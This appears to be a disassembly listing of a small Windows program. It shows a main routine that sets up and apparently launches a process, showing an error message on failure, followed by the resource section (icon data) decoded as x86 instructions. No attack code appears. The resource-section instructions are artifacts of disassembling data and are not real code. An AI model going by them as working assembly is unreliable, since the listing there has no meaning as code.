  402650:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  402654:	83 e4 f0             	and    $0xfffffff0,%esp
  402657:	ff 71 fc             	push   -0x4(%ecx)
  40265a:	55                   	push   %ebp
  40265b:	89 e5                	mov    %esp,%ebp
  40265d:	57                   	push   %edi
  40265e:	56                   	push   %esi
  40265f:	51                   	push   %ecx
  402660:	8d 7d 8c             	lea    -0x74(%ebp),%edi
  402663:	be 58 40 40 00       	mov    $0x404058,%esi
  402668:	81 ec fc 00 00 00    	sub    $0xfc,%esp
  40266e:	e8 1d f0 ff ff       	call   0x401690
  402673:	a1 b4 40 40 00       	mov    0x4040b4,%eax
  402678:	b9 17 00 00 00       	mov    $0x17,%ecx
  40267d:	8d 55 8c             	lea    -0x74(%ebp),%edx
  402680:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402682:	8d 8d 48 ff ff ff    	lea    -0xb8(%ebp),%ecx
  402688:	89 85 2a ff ff ff    	mov    %eax,-0xd6(%ebp)
  40268e:	a1 b8 40 40 00       	mov    0x4040b8,%eax
  402693:	89 85 2e ff ff ff    	mov    %eax,-0xd2(%ebp)
  402699:	a1 bc 40 40 00       	mov    0x4040bc,%eax
  40269e:	89 85 32 ff ff ff    	mov    %eax,-0xce(%ebp)
  4026a4:	0f b7 05 c0 40 40 00 	movzwl 0x4040c0,%eax
  4026ab:	66 89 85 36 ff ff ff 	mov    %ax,-0xca(%ebp)
  4026b2:	89 c8                	mov    %ecx,%eax
  4026b4:	c6 00 00             	movb   $0x0,(%eax)
  4026b7:	83 c0 01             	add    $0x1,%eax
  4026ba:	39 d0                	cmp    %edx,%eax
  4026bc:	75 f6                	jne    0x4026b4
  4026be:	8d b5 38 ff ff ff    	lea    -0xc8(%ebp),%esi
  4026c4:	c7 85 48 ff ff ff 44 	movl   $0x44,-0xb8(%ebp)
  4026cb:	00 00 00 
  4026ce:	89 f0                	mov    %esi,%eax
  4026d0:	c6 00 00             	movb   $0x0,(%eax)
  4026d3:	83 c0 01             	add    $0x1,%eax
  4026d6:	39 c1                	cmp    %eax,%ecx
  4026d8:	75 f6                	jne    0x4026d0
  4026da:	8d 85 2a ff ff ff    	lea    -0xd6(%ebp),%eax
  4026e0:	89 74 24 24          	mov    %esi,0x24(%esp)
  4026e4:	89 4c 24 20          	mov    %ecx,0x20(%esp)
  4026e8:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  4026ef:	00 
  4026f0:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  4026f7:	00 
  4026f8:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4026fc:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  402703:	00 
  402704:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  40270b:	00 
  40270c:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  402713:	00 
  402714:	89 54 24 04          	mov    %edx,0x4(%esp)
  402718:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  40271f:	ff 15 24 61 40 00    	call   *0x406124
  402725:	83 ec 28             	sub    $0x28,%esp
  402728:	85 c0                	test   %eax,%eax
  40272a:	74 2b                	je     0x402757
  40272c:	8b 85 38 ff ff ff    	mov    -0xc8(%ebp),%eax
  402732:	8b 35 20 61 40 00    	mov    0x406120,%esi
  402738:	89 04 24             	mov    %eax,(%esp)
  40273b:	ff d6                	call   *%esi
  40273d:	50                   	push   %eax
  40273e:	8b 85 3c ff ff ff    	mov    -0xc4(%ebp),%eax
  402744:	89 04 24             	mov    %eax,(%esp)
  402747:	ff d6                	call   *%esi
  402749:	52                   	push   %edx
  40274a:	31 c0                	xor    %eax,%eax
  40274c:	8d 65 f4             	lea    -0xc(%ebp),%esp
  40274f:	59                   	pop    %ecx
  402750:	5e                   	pop    %esi
  402751:	5f                   	pop    %edi
  402752:	5d                   	pop    %ebp
  402753:	8d 61 fc             	lea    -0x4(%ecx),%esp
  402756:	c3                   	ret
  402757:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  40275e:	00 
  40275f:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  402766:	00 
  402767:	c7 44 24 04 00 40 40 	movl   $0x404000,0x4(%esp)
  40276e:	00 
  40276f:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402776:	ff 15 e8 61 40 00    	call   *0x4061e8
  40277c:	b8 01 00 00 00       	mov    $0x1,%eax
  402781:	83 ec 10             	sub    $0x10,%esp
  402784:	eb c6                	jmp    0x40274c
  402786:	90                   	nop
  402787:	90                   	nop
  402788:	90                   	nop
  402789:	90                   	nop
  40278a:	90                   	nop
  40278b:	90                   	nop
  40278c:	90                   	nop
  40278d:	90                   	nop
  40278e:	90                   	nop
  40278f:	90                   	nop
  402790:	55                   	push   %ebp
  402791:	89 e5                	mov    %esp,%ebp
  402793:	5d                   	pop    %ebp
  402794:	e9 67 ed ff ff       	jmp    0x401500
  402799:	90                   	nop
  40279a:	90                   	nop
  40279b:	90                   	nop
  40279c:	90                   	nop
  40279d:	90                   	nop
  40279e:	90                   	nop
  40279f:	90                   	nop
  4027a0:	ff                   	(bad)
  4027a1:	ff                   	(bad)
  4027a2:	ff                   	(bad)
  4027a3:	ff 90 27 40 00 00    	call   *0x4027(%eax)
  4027a9:	00 00                	add    %al,(%eax)
  4027ab:	00 ff                	add    %bh,%bh
  4027ad:	ff                   	(bad)
  4027ae:	ff                   	(bad)
  4027af:	ff 00                	incl   (%eax)
  4027b1:	00 00                	add    %al,(%eax)
	...

Disassembly of section .rsrc:

00409000 <.rsrc>:
	...
  40900c:	00 00                	add    %al,(%eax)
  40900e:	03 00                	add    (%eax),%eax
  409010:	03 00                	add    (%eax),%eax
  409012:	00 00                	add    %al,(%eax)
  409014:	28 00                	sub    %al,(%eax)
  409016:	00 80 0e 00 00 00    	add    %al,0xe(%eax)
  40901c:	58                   	pop    %eax
  40901d:	00 00                	add    %al,(%eax)
  40901f:	80 18 00             	sbbb   $0x0,(%eax)
  409022:	00 00                	add    %al,(%eax)
  409024:	88 00                	mov    %al,(%eax)
  409026:	00 80 00 00 00 00    	add    %al,0x0(%eax)
	...
  409034:	00 00                	add    %al,(%eax)
  409036:	01 00                	add    %eax,(%eax)
  409038:	01 00                	add    %eax,(%eax)
  40903a:	00 00                	add    %al,(%eax)
  40903c:	40                   	inc    %eax
  40903d:	00 00                	add    %al,(%eax)
  40903f:	80 00 00             	addb   $0x0,(%eax)
	...
  40904e:	01 00                	add    %eax,(%eax)
  409050:	09 04 00             	or     %eax,(%eax,%eax,1)
  409053:	00 b8 00 00 00 00    	add    %bh,0x0(%eax)
	...
  409065:	00 01                	add    %al,(%ecx)
  409067:	00 01                	add    %al,(%ecx)
  409069:	00 00                	add    %al,(%eax)
  40906b:	00 70 00             	add    %dh,0x0(%eax)
  40906e:	00 80 00 00 00 00    	add    %al,0x0(%eax)
	...
  40907c:	00 00                	add    %al,(%eax)
  40907e:	01 00                	add    %eax,(%eax)
  409080:	09 04 00             	or     %eax,(%eax,%eax,1)
  409083:	00 c8                	add    %cl,%al
	...
  409095:	00 01                	add    %al,(%ecx)
  409097:	00 01                	add    %al,(%ecx)
  409099:	00 00                	add    %al,(%eax)
  40909b:	00 a0 00 00 80 00    	add    %ah,0x800000(%eax)
	...
  4090ad:	00 01                	add    %al,(%ecx)
  4090af:	00 09                	add    %cl,(%ecx)
  4090b1:	04 00                	add    $0x0,%al
  4090b3:	00 d8                	add    %bl,%al
  4090b5:	00 00                	add    %al,(%eax)
  4090b7:	00 e8                	add    %ch,%al
  4090b9:	90                   	nop
  4090ba:	00 00                	add    %al,(%eax)
  4090bc:	a8 08                	test   $0x8,%al
	...
  4090c6:	00 00                	add    %al,(%eax)
  4090c8:	90                   	nop
  4090c9:	99                   	cltd
  4090ca:	00 00                	add    %al,(%eax)
  4090cc:	14 00                	adc    $0x0,%al
	...
  4090d6:	00 00                	add    %al,(%eax)
  4090d8:	a8 99                	test   $0x99,%al
  4090da:	00 00                	add    %al,(%eax)
  4090dc:	6c                   	insb   (%dx),%es:(%edi)
  4090dd:	01 00                	add    %eax,(%eax)
	...
  4090e7:	00 28                	add    %ch,(%eax)
  4090e9:	00 00                	add    %al,(%eax)
  4090eb:	00 20                	add    %ah,(%eax)
  4090ed:	00 00                	add    %al,(%eax)
  4090ef:	00 40 00             	add    %al,0x0(%eax)
  4090f2:	00 00                	add    %al,(%eax)
  4090f4:	01 00                	add    %eax,(%eax)
  4090f6:	08 00                	or     %al,(%eax)
  4090f8:	00 00                	add    %al,(%eax)
  4090fa:	00 00                	add    %al,(%eax)
  4090fc:	00 04 00             	add    %al,(%eax,%eax,1)
  4090ff:	00 c3                	add    %al,%bl
  409101:	0e                   	push   %cs
  409102:	00 00                	add    %al,(%eax)
  409104:	c3                   	ret
  409105:	0e                   	push   %cs
  409106:	00 00                	add    %al,(%eax)
  409108:	00 01                	add    %al,(%ecx)
  40910a:	00 00                	add    %al,(%eax)
  40910c:	00 01                	add    %al,(%ecx)
  40910e:	00 00                	add    %al,(%eax)
  409110:	ff                   	(bad)
  409111:	ff                   	(bad)
  409112:	ff 00                	incl   (%eax)
  409114:	96                   	xchg   %eax,%esi
  409115:	9f                   	lahf
  409116:	8b 00                	mov    (%eax),%eax
  409118:	65 87 8e 00 54 c0 be 	xchg   %ecx,%gs:-0x413fac00(%esi)
  40911f:	00 4f b6             	add    %cl,-0x4a(%edi)
  409122:	b5 00                	mov    $0x0,%ch
  409124:	65 d7                	xlat   %gs:(%ebx)
  409126:	d5 00                	aad    $0x0
  409128:	7a ed                	jp     0x409117
  40912a:	ec                   	in     (%dx),%al
  40912b:	00 9d f4 f3 00 c3    	add    %bl,-0x3cff0c0c(%ebp)
  409131:	fa                   	cli
  409132:	fa                   	cli
  409133:	00 db                	add    %bl,%bl
  409135:	fd                   	std
  409136:	ff 00                	incl   (%eax)
  409138:	e6 fd                	out    %al,$0xfd
  40913a:	fa                   	cli
  40913b:	00 d3                	add    %dl,%bl
  40913d:	fc                   	cld
  40913e:	ff 00                	incl   (%eax)
  409140:	de ee                	fsubrp %st,%st(6)
  409142:	eb 00                	jmp    0x409144
  409144:	e7 e6                	out    %eax,$0xe6
  409146:	d5 00                	aad    $0x0
  409148:	c5 c7 b9             	(bad)
  40914b:	00 f5                	add    %dh,%ch
  40914d:	f3 df 00             	repz filds (%eax)
  409150:	fd                   	std
  409151:	fc                   	cld
  409152:	eb 00                	jmp    0x409154
  409154:	fc                   	cld
  409155:	fc                   	cld
  409156:	fa                   	cli
  409157:	00 fe                	add    %bh,%dh
  409159:	fe                   	(bad)
  40915a:	f4                   	hlt
  40915b:	00 9c a5 a1 00 fe fc 	add    %bl,-0x301ff5f(%ebp,%eiz,4)
  409162:	e3 00                	jecxz  0x409164
  409164:	cc                   	int3
  409165:	d2 cf                	ror    %cl,%bh
  409167:	00 23                	add    %ah,(%ebx)
  409169:	33 35 00 03 05 05    	xor    0x5050300,%esi
  40916f:	00 45 b6             	add    %al,-0x4a(%ebp)
  409172:	b4 00                	mov    $0x0,%ah
  409174:	0c 67                	or     $0x67,%al
  409176:	68 00 5e cc cb       	push   $0xcbcc5e00
  40917b:	00 6b d3             	add    %ch,-0x2d(%ebx)
  40917e:	d1 00                	roll   $1,(%eax)
  409180:	81 e8 e6 00 ac fe    	sub    $0xfeac00e6,%eax
  409186:	fe 00                	incb   (%eax)
  409188:	f7 fc                	idiv   %esp
  40918a:	fe 00                	incb   (%eax)
  40918c:	f5                   	cmc
  40918d:	fe                   	(bad)
  40918e:	f3 00 b0 b3 a7 00 f8 	repz add %dh,-0x7ff584d(%eax)
  409195:	f6 e5                	mul    %ch
  409197:	00 e1                	add    %ah,%cl
  409199:	e0 c8                	loopne 0x409163
  40919b:	00 88 91 8d 00 66    	add    %cl,0x66008d91(%eax)
  4091a1:	ed                   	in     (%dx),%eax
  4091a2:	ec                   	in     (%dx),%al
  4091a3:	00 5a d2             	add    %bl,-0x2e(%edx)
  4091a6:	d0 00                	rolb   $1,(%eax)
  4091a8:	5f                   	pop    %edi
  4091a9:	df dc                	(bad)
  4091ab:	00 79 f4             	add    %bh,-0xc(%ecx)
  4091ae:	f1                   	int1
  4091af:	00 74 f1 ee          	add    %dh,-0x12(%ecx,%esi,8)
  4091b3:	00 70 ec             	add    %dh,-0x14(%eax)
  4091b6:	ea 00 84 ec eb 00 a4 	ljmp   $0xa400,$0xebec8400
  4091bd:	ff                   	(bad)
  4091be:	fe 00                	incb   (%eax)
  4091c0:	bd fe fe 00 e9       	mov    $0xe900fefe,%ebp
  4091c5:	f4                   	hlt
  4091c6:	de 00                	fiadds (%eax)
  4091c8:	d2 d4                	rcl    %cl,%ah
  4091ca:	bd 00 f2 f0 cf       	mov    $0xcff0f200,%ebp
  4091cf:	00 ef                	add    %ch,%bh
  4091d1:	ed                   	in     (%dx),%eax
  4091d2:	d5 00                	aad    $0x0
  4091d4:	f5                   	cmc
  4091d5:	f6 f5                	div    %ch
  4091d7:	00 5e 61             	add    %bl,0x61(%esi)
  4091da:	60                   	pusha
  4091db:	00 6b f2             	add    %ch,-0xe(%ebx)
  4091de:	ef                   	out    %eax,(%dx)
  4091df:	00 84 f7 f6 00 8f fb 	add    %al,-0x470ff0a(%edi,%esi,8)
  4091e6:	fa                   	cli
  4091e7:	00 9c fe fd 00 b4 fe 	add    %bl,-0x14bff03(%esi,%edi,8)
  4091ee:	fe 00                	incb   (%eax)
  4091f0:	ce                   	into
  4091f1:	fc                   	cld
  4091f2:	fb                   	sti
  4091f3:	00 bd de df 00 cc    	add    %bh,-0x33ff2022(%ebp)
  4091f9:	e1 de                	loope  0x4091d9
  4091fb:	00 7f 84             	add    %bh,-0x7c(%edi)
  4091fe:	79 00                	jns    0x409200
  409200:	ed                   	in     (%dx),%eax
  409201:	ea c6 00 71 e7 e5 00 	ljmp   $0xe5,$0xe77100c6
  409208:	94                   	xchg   %eax,%esp
  409209:	f7 f6                	div    %esi
  40920b:	00 ec                	add    %ch,%ah
  40920d:	f9                   	stc
  40920e:	fe 00                	incb   (%eax)
  409210:	cb                   	lret
  409211:	f8                   	clc
  409212:	f7 00 84 e2 e1 00    	testl  $0xe1e284,(%eax)
  409218:	8e f1                	mov    %ecx,%?
  40921a:	f0 00 c9             	lock add %cl,%cl
  40921d:	f2 f2 00 b5 ba b4 00 	repnz repnz add %dh,0x800b4ba(%ebp)
  409224:	08 
  409225:	07                   	pop    %es
  409226:	07                   	pop    %es
  409227:	00 7b dd             	add    %bh,-0x23(%ebx)
  40922a:	dc 00                	faddl  (%eax)
  40922c:	8e eb                	mov    %ebx,%gs
  40922e:	ea 00 81 df de 00 a4 	ljmp   $0xa400,$0xdedf8100
  409235:	f4                   	hlt
  409236:	f4                   	hlt
  409237:	00 bb f5 f4 00 b5    	add    %bh,-0x4aff0b0b(%ebx)
  40923d:	e6 e7                	out    %al,$0xe7
  40923f:	00 0d 10 10 00 1e    	add    %cl,0x1e001010
  409245:	1f                   	pop    %ds
  409246:	1f                   	pop    %ds
  409247:	00 8c de de 00 93 e3 	add    %cl,-0x1c6cff22(%esi,%ebx,8)
  40924e:	e3 00                	jecxz  0x409250
  409250:	8d                   	lea    (bad),%esp
  409251:	e4 e3                	in     $0xe3,%al
  409253:	00 ae de e4 00 a5    	add    %ch,-0x5aff1b22(%esi)
  409259:	bf c0 00 9e ec       	mov    $0xec9e00c0,%edi
  40925e:	eb 00                	jmp    0x409260
  409260:	66 b6 b7             	data16 mov $0xb7,%dh
  409263:	00 8a e8 e7 00 aa    	add    %cl,-0x55ff1818(%edx)
  409269:	f5                   	cmc
  40926a:	f4                   	hlt
  40926b:	00 85 d6 d6 00 a4    	add    %al,-0x5bff292a(%ebp)
  409271:	c9                   	leave
  409272:	c9                   	leave
  409273:	00 b5 ef ef 00 5e    	add    %dh,0x5e00efef(%ebp)
  409279:	ae                   	scas   %es:(%edi),%al
  40927a:	b0 00                	mov    $0x0,%al
  40927c:	5b                   	pop    %ebx
  40927d:	c7 c5 00 a8 ef ee    	mov    $0xeeefa800,%ebp
  409283:	00 41 48             	add    %al,0x48(%ecx)
  409286:	47                   	inc    %edi
  409287:	00 23                	add    %ah,(%ebx)
  409289:	24 23                	and    $0x23,%al
  40928b:	00 91 d0 d0 00 5f    	add    %dl,0x5f00d0d0(%ecx)
  409291:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  409292:	aa                   	stos   %al,%es:(%edi)
  409293:	00 59 bb             	add    %bl,-0x45(%ecx)
  409296:	b9 00 77 d3 d3       	mov    $0xd3d37700,%ecx
  40929b:	00 9c e3 e3 00 75 cd 	add    %bl,-0x328aff1d(%ebx,%eiz,8)
  4092a2:	cc                   	int3
  4092a3:	00 9c f8 f7 00 b3 f3 	add    %bl,-0xc4cff09(%eax,%edi,8)
  4092aa:	f1                   	int1
  4092ab:	00 4c 7b 83          	add    %cl,-0x7d(%ebx,%edi,2)
  4092af:	00 ea                	add    %ch,%dl
  4092b1:	ec                   	in     (%dx),%al
  4092b2:	e9 00 2f 84 84       	jmp    0x84c4c1b7
  4092b7:	00 65 c0             	add    %ah,-0x40(%ebp)
  4092ba:	bf 00 94 ed ec       	mov    $0xeced9400,%edi
  4092bf:	00 74 dc db          	add    %dh,-0x25(%esp,%ebx,8)
  4092c3:	00 41 bb             	add    %al,-0x45(%ecx)
  4092c6:	b9 00 7a e4 e3       	mov    $0xe3e47a00,%ecx
  4092cb:	00 76 a1             	add    %dh,-0x5f(%esi)
  4092ce:	a3 00 f9 f8 df       	mov    %eax,0xdff8f900
  4092d3:	00 e6                	add    %ah,%dh
  4092d5:	e7 e3                	out    %eax,$0xe3
  4092d7:	00 5f 94             	add    %bl,-0x6c(%edi)
  4092da:	a1 00 47 9f 9f       	mov    0x9f9f4700,%eax
  4092df:	00 44 af ad          	add    %al,-0x53(%edi,%ebp,4)
  4092e3:	00 52 ad             	add    %dl,-0x53(%edx)
  4092e6:	ac                   	lods   %ds:(%esi),%al
  4092e7:	00 68 cd             	add    %ch,-0x33(%eax)
  4092ea:	cc                   	int3
  4092eb:	00 35 ad ab 00 4a    	add    %dh,0x4a00abad
  4092f1:	be bc 00 3b a5       	mov    $0xa53b00bc,%esi
  4092f6:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4092f7:	00 6a c6             	add    %ch,-0x3a(%edx)
  4092fa:	c5 00                	lds    (%eax),%eax
  4092fc:	22 a1 9f 00 dc e3    	and    -0x1c23ff61(%ecx),%ah
  409302:	e2 00                	loop   0x409304
  409304:	71 b5                	jno    0x4092bb
  409306:	ca 00 2f             	lret   $0x2f00
  409309:	9e                   	sahf
  40930a:	9c                   	pushf
  40930b:	00 51 90             	add    %dl,-0x70(%ecx)
  40930e:	93                   	xchg   %eax,%ebx
  40930f:	00 3b                	add    %bh,(%ebx)
  409311:	95                   	xchg   %eax,%ebp
  409312:	94                   	xchg   %eax,%esp
  409313:	00 46 c7             	add    %al,-0x39(%esi)
  409316:	c4 00                	les    (%eax),%eax
  409318:	41                   	inc    %ecx
  409319:	cb                   	lret
  40931a:	c8 00 96 c6          	enter  $0x9600,$0xc6
  40931e:	d8 00                	fadds  (%eax)
  409320:	28 73 75             	sub    %dh,0x75(%ebx)
  409323:	00 68 da             	add    %ch,-0x26(%eax)
  409326:	d7                   	xlat   %ds:(%ebx)
  409327:	00 39                	add    %bh,(%ecx)
  409329:	c2 bf 00             	ret    $0xbf
  40932c:	51                   	push   %ecx
  40932d:	ca c7 00             	lret   $0xc7
  409330:	47                   	inc    %edi
  409331:	d1 ce                	ror    $1,%esi
  409333:	00 46 c2             	add    %al,-0x3e(%esi)
  409336:	bf 00 35 ba b7       	mov    $0xb7ba3500,%edi
  40933b:	00 6e e1             	add    %ch,-0x1f(%esi)
  40933e:	df 00                	filds  (%eax)
  409340:	d0 ee                	shr    $1,%dh
  409342:	f0 00 f0             	lock add %dh,%al
  409345:	ee                   	out    %al,(%dx)
  409346:	e1 00                	loope  0x409348
  409348:	51                   	push   %ecx
  409349:	ce                   	into
  40934a:	cb                   	lret
  40934b:	00 7d c3             	add    %bh,-0x3d(%ebp)
  40934e:	d5 00                	aad    $0x0
  409350:	12 4d 4f             	adc    0x4f(%ebp),%cl
  409353:	00 2f                	add    %ch,(%edi)
  409355:	5f                   	pop    %edi
  409356:	63 00                	arpl   %eax,(%eax)
  409358:	7c af                	jl     0x409309
  40935a:	b1 00                	mov    $0x0,%cl
  40935c:	6c                   	insb   (%dx),%es:(%edi)
  40935d:	dc da                	(bad)
  40935f:	00 32                	add    %dh,(%edx)
  409361:	b3 b1                	mov    $0xb1,%bl
  409363:	00 06                	add    %al,(%esi)
  409365:	1a 1a                	sbb    (%edx),%bl
  409367:	00 09                	add    %cl,(%ecx)
  409369:	2e 32 00             	xor    %cs:(%eax),%al
  40936c:	0c 3e                	or     $0x3e,%al
  40936e:	41                   	inc    %ecx
  40936f:	00 62 e6             	add    %ah,-0x1a(%edx)
  409372:	e4 00                	in     $0x0,%al
  409374:	2c a7                	sub    $0xa7,%al
  409376:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  409377:	00 3c b6             	add    %bh,(%esi,%esi,4)
  40937a:	b4 00                	mov    $0x0,%ah
  40937c:	25 91 91 00 06       	and    $0x6009191,%eax
  409381:	1f                   	pop    %ds
  409382:	24 00                	and    $0x0,%al
  409384:	51                   	push   %ecx
  409385:	c6 c3 00             	mov    $0x0,%bl
  409388:	79 ba                	jns    0x409344
  40938a:	bb 00 d7 db d5       	mov    $0xd5dbd700,%ebx
  40938f:	00 0a                	add    %cl,(%edx)
  409391:	81 82 00 32 f0 ed 00 	addl   $0xc7c77800,-0x120fce00(%edx)
  409398:	78 c7 c7 
  40939b:	00 88 c7 c8 00 93    	add    %cl,-0x6cff3739(%eax)
  4093a1:	b9 bc 00 c9 e6       	mov    $0xe6c900bc,%ecx
  4093a6:	e6 00                	out    %al,$0x0
  4093a8:	4f                   	dec    %edi
  4093a9:	db d9                	fcmovnu %st(1),%st
  4093ab:	00 b7 d4 d1 00 09    	add    %dh,0x900d1d4(%edi)
  4093b1:	b4 b3                	mov    $0xb3,%ah
  4093b3:	00 03                	add    %al,(%ebx)
  4093b5:	9e                   	sahf
  4093b6:	9b                   	fwait
  4093b7:	00 8c c0 b9 00 03 0a 	add    %cl,0xa0300b9(%eax,%eax,8)
  4093be:	0b 00                	or     (%eax),%eax
  4093c0:	61                   	popa
  4093c1:	9e                   	sahf
  4093c2:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4093c3:	00 4e e3             	add    %cl,-0x1d(%esi)
  4093c6:	e2 00                	loop   0x4093c8
  4093c8:	2d d7 d5 00 dc       	sub    $0xdc00d5d7,%eax
  4093cd:	f7 ff                	idiv   %edi
  4093cf:	00 d2                	add    %dl,%dl
  4093d1:	f3 ff 00             	repz incl (%eax)
  4093d4:	ce                   	into
  4093d5:	ed                   	in     (%dx),%eax
  4093d6:	ff 00                	incl   (%eax)
  4093d8:	ca f5 fe             	lret   $0xfef5
  4093db:	00 ab d4 fd 00 dd    	add    %ch,-0x22ff022c(%ebx)
  4093e1:	f8                   	clc
  4093e2:	e5 00                	in     $0x0,%eax
  4093e4:	c5 f1 fc 00          	vpaddb (%eax),%xmm1,%xmm0
  4093e8:	b9 e5 f9 00 a6       	mov    $0xa600f9e5,%ecx
  4093ed:	d5 e2                	aad    $0xe2
  4093ef:	00 c3                	add    %al,%bl
  4093f1:	eb f0                	jmp    0x4093e3
  4093f3:	00 99 dd de 00 00    	add    %bl,0xdedd(%ecx)
	...
  40950d:	00 00                	add    %al,(%eax)
  40950f:	00 8c 8c b8 b8 b8 4b 	add    %cl,0x4bb8b8b8(%esp,%ecx,4)
  409516:	4b                   	dec    %ebx
  409517:	51                   	push   %ecx
  409518:	51                   	push   %ecx
  409519:	b7 02                	mov    $0x2,%bh
  40951b:	b8 68 a2 48 3d       	mov    $0x3d48a268,%eax
  409520:	1b 19                	sbb    (%ecx),%ebx
  409522:	69 99 99 77 98 48 39 	imul   $0x6b53b939,0x48987799(%ecx),%ebx
  409529:	b9 53 6b 
  40952c:	4e                   	dec    %esi
  40952d:	5c                   	pop    %esp
  40952e:	66 13 b6 b5 0b 0b 0b 	adc    0xb0b0bb5(%esi),%si
  409535:	38 b2 b5 b5 b5 02    	cmp    %dh,0x2b5b5b5(%edx)
  40953b:	3f                   	aas
  40953c:	51                   	push   %ecx
  40953d:	74 89                	je     0x4094c8
  40953f:	3d 93 73 9b 6d       	cmp    $0x6d9b7393,%eax
  409544:	8a 94 28 6b 43 07 36 	mov    0x3607436b(%eax,%ebp,1),%dl
  40954b:	65 2a 34 49          	sub    %gs:(%ecx,%ecx,2),%dh
  40954f:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  409550:	51                   	push   %ecx
  409551:	b7 b8                	mov    $0xb8,%bh
  409553:	09 0b                	or     %ecx,(%ebx)
  409555:	0b 0b                	or     (%ebx),%ecx
  409557:	b2 b5                	mov    $0xb5,%dl
  409559:	b5 02                	mov    $0x2,%ch
  40955b:	b6 5a                	mov    $0x5a,%dh
  40955d:	74 26                	je     0x409585
  40955f:	1b 3d 75 80 89 86    	sbb    0x86898075,%edi
  409565:	86 06                	xchg   %al,(%esi)
  409567:	5c                   	pop    %esp
  409568:	5c                   	pop    %esp
  409569:	2a 36                	sub    (%esi),%dh
  40956b:	2a 93 41 56 44 09    	sub    0x9445641(%ebx),%dl
  409571:	09 0b                	or     %ecx,(%ebx)
  409573:	51                   	push   %ecx
  409574:	0b 0b                	or     (%ebx),%ecx
  409576:	0b 38                	or     (%eax),%edi
  409578:	b2 b5                	mov    $0xb5,%dl
  40957a:	b5 72                	mov    $0x72,%ch
  40957c:	54                   	push   %esp
  40957d:	05 6e 2a 2a 75       	add    $0x752a2a6e,%eax
  409582:	73 9d                	jae    0x409521
  409584:	86 8e 62 59 6b 42    	xchg   %cl,0x426b5962(%esi)
  40958a:	6e                   	outsb  %ds:(%esi),(%dx)
  40958b:	1b 3d a3 0e 8d 09    	sbb    0x98d0ea3,%edi
  409591:	09 09                	or     %ecx,(%ecx)
  409593:	09 0b                	or     %ecx,(%ebx)
  409595:	0b 0b                	or     (%ebx),%ecx
  409597:	38 b5 b6 4b 9e 5b    	cmp    %dh,0x5b9e4bb6(%ebp)
  40959d:	6b 42 34 29          	imul   $0x29,0x34(%edx),%eax
  4095a1:	5a                   	pop    %edx
  4095a2:	75 1a                	jne    0x4095be
  4095a4:	89 05 4f 63 4f 46    	mov    %eax,0x464f634f
  4095aa:	76 3d                	jbe    0x4095e9
  4095ac:	92                   	xchg   %eax,%edx
  4095ad:	b4 21                	mov    $0x21,%ah
  4095af:	0d 0a 0a 09 09       	or     $0x9090a0a,%eax
  4095b4:	09 09                	or     %ecx,(%ecx)
  4095b6:	b1 b3                	mov    $0xb3,%cl
  4095b8:	b3 b3                	mov    $0xb3,%bl
  4095ba:	b3 02                	mov    $0x2,%bl
  4095bc:	8e 48 2a             	mov    0x2a(%eax),%cs
  4095bf:	27                   	daa
  4095c0:	98                   	cwtl
  4095c1:	75 7a                	jne    0x40963d
  4095c3:	1a 86 76 4e 4f 57    	sbb    0x574f4e76(%esi),%al
  4095c9:	62 47 aa             	bound  %eax,-0x56(%edi)
  4095cc:	b4 21                	mov    $0x21,%ah
  4095ce:	8d 22                	lea    (%edx),%esp
  4095d0:	0a 0a                	or     (%edx),%cl
  4095d2:	09 0a                	or     %ecx,(%edx)
  4095d4:	0a af b0 b1 b1 b0    	or     -0x4f4e4e50(%edi),%ch
  4095da:	b2 92                	mov    $0x92,%dl
  4095dc:	6a 1b                	push   $0x1b
  4095de:	6c                   	insb   (%dx),%es:(%edi)
  4095df:	98                   	cwtl
  4095e0:	74 7f                	je     0x409661
  4095e2:	64 25 82 57 a3 4e    	fs and $0x4ea35782,%eax
  4095e8:	4f                   	dec    %edi
  4095e9:	53                   	push   %ebx
  4095ea:	aa                   	stos   %al,%es:(%edi)
  4095eb:	2d 70 70 0f 0d       	sub    $0xd0f7070,%eax
  4095f0:	0a 0a                	or     (%edx),%cl
  4095f2:	0a 0a                	or     (%edx),%cl
  4095f4:	0a 3f                	or     (%edi),%bh
  4095f6:	5c                   	pop    %esp
  4095f7:	7b 97                	jnp    0x409590
  4095f9:	90                   	nop
  4095fa:	84 54 7a 03          	test   %dl,0x3(%edx,%edi,2)
  4095fe:	05 26 89 6c 48       	add    $0x486c8926,%eax
  409603:	85 81 60 a3 66 59    	test   %eax,0x5966a360(%ecx)
  409609:	4b                   	dec    %ebx
  40960a:	15 0f 0f 14 14       	adc    $0x14140f0f,%eax
  40960f:	30 3f                	xor    %bh,(%edi)
  409611:	3f                   	aas
  409612:	1e                   	push   %ds
  409613:	11 11                	adc    %edx,(%ecx)
  409615:	11 ae 96 97 a9 4e    	adc    %ebp,0x4ea99796(%esi)
  40961b:	54                   	push   %esp
  40961c:	54                   	push   %esp
  40961d:	77 06                	ja     0x409625
  40961f:	ad                   	lods   %ds:(%esi),%eax
  409620:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  409621:	47                   	inc    %edi
  409622:	49                   	dec    %ecx
  409623:	76 26                	jbe    0x40964b
  409625:	7f 6f                	jg     0x409696
  409627:	4b                   	dec    %ebx
  409628:	3f                   	aas
  409629:	15 13 0e 14 70       	adc    $0x70140e13,%eax
  40962e:	10 8d 15 11 11 11    	adc    %cl,0x11111115(%ebp)
  409634:	11 11                	adc    %edx,(%ecx)
  409636:	a0 ab 97 19 a9       	mov    0xa91997ab,%al
  40963b:	ac                   	lods   %ds:(%esi),%al
  40963c:	54                   	push   %esp
